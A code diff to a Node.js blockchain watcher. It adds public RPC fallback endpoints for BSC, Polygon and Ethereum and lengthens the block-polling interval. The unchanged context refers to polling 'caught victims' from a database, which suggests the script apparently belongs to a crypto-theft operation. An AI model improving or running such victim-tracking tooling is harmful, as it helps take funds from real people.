@@ -1,7 +1,7 @@
 import 'dotenv/config';
 import path from 'path';
 import { fileURLToPath } from 'url';
-import { createPublicClient, http } from 'viem';
+import { createPublicClient, http, fallback } from 'viem';
 import { mainnet, bsc, polygon } from 'viem/chains';
 import { exec } from 'child_process';
 import { promisify } from 'util';
@@ -200,9 +200,41 @@ let lastStatsLogTime = 0;
 const STATS_LOG_INTERVAL_MS = 60 * 60 * 1000;
 
 // --- HTTP client for block polling ---
+// ─── Public RPC Fallbacks ───
+const PUBLIC_FALLBACKS = {
+  bsc: [
+    'https://bsc-dataseed.binance.org',
+    'https://rpc.ankr.com/bsc',
+    'https://bsc.publicnode.com',
+    'https://1rpc.io/bnb',
+    'https://bsc.drpc.org',
+  ],
+  polygon: [
+    'https://polygon-rpc.com',
+    'https://rpc.ankr.com/polygon',
+    'https://polygon.llamarpc.com',
+    'https://polygon.publicnode.com',
+    'https://1rpc.io/polygon',
+  ],
+  ethereum: [
+    'https://ethereum.publicnode.com',
+    'https://rpc.ankr.com/eth',
+    'https://eth.llamarpc.com',
+    'https://1rpc.io/eth',
+    'https://eth.drpc.org',
+  ],
+};
+
+const normalizedChain = chainName?.toLowerCase() || '';
+const rawUrls = [chainRpc, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
+const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));
+
 const client = createPublicClient({
   chain: viemChain,
-  transport: http(chainRpc, { timeout: 10000 }),
+  transport: fallback(
+    fallbackUrls.map(url => http(url, { timeout: 8000 })),
+    { rank: false }
+  ),
 });
 
 // --- Helper: retry wrapper ---
@@ -427,7 +459,7 @@ function startWatcher() {
     }
   })();
 
-  blockPollInterval = setInterval(scanNewBlocks, 2000);
+  blockPollInterval = setInterval(scanNewBlocks, 120000);
 
   // Poll caught victims every 15 seconds from DB
   caughtVictimsPollInterval = setInterval(loadCaughtVictims, 15000);
